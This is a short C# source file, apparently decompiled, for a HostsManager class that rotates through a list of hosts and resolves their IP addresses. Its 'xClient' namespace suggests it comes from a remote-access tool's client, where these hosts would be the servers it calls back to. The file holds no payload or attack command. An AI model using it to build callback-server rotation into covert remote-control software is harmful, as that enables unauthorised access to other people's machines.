using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using xClient.Core.Data;

namespace xClient.Core.Utilities;

public class HostsManager
{
	private readonly Queue<Host> _hosts = new Queue<Host>();

	public bool IsEmpty => _hosts.Count == 0;

	public HostsManager(List<Host> hosts)
	{
		foreach (Host host in hosts)
		{
			_hosts.Enqueue(host);
		}
	}

	public Host GetNextHost()
	{
		Host host = _hosts.Dequeue();
		_hosts.Enqueue(host);
		host.IpAddress = GetIp(host);
		return host;
	}

	private static IPAddress GetIp(Host host)
	{
		if (string.IsNullOrEmpty(host.Hostname))
		{
			return null;
		}
		if (IPAddress.TryParse(host.Hostname, out var address))
		{
			if (address.AddressFamily == AddressFamily.InterNetworkV6 && !Socket.OSSupportsIPv6)
			{
				return null;
			}
			return address;
		}
		IPAddress[] addressList = Dns.GetHostEntry(host.Hostname).AddressList;
		IPAddress[] array = addressList;
		foreach (IPAddress iPAddress in array)
		{
			switch (iPAddress.AddressFamily)
			{
			case AddressFamily.InterNetwork:
				return iPAddress;
			case AddressFamily.InterNetworkV6:
				if (addressList.Length == 1)
				{
					return iPAddress;
				}
				break;
			}
		}
		return address;
	}
}
